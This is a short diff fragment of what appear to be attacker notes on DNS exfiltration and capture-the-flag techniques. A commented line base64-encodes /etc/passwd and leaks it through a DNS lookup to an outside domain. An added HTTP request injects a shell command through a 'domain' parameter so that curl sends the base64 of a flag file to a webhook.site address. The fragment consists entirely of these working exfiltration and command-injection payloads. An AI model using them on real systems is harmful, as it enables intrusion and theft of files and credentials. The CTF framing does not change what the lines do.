@@ -16,8 +16,8 @@ DNS exfiltration
 # a=$(head -1 /etc/passwd|base64);host $a.kiki.com
 
 
-
-
+###  CTF 
+GET /blind.php?domain=cdac.in;curl+https://webhook.site/d7ee1783-2ace-4702-8fc6-3a3f320b4c3b/`cat+/flag/win.txt+|+base64` HTTP/1.1
 
 
 
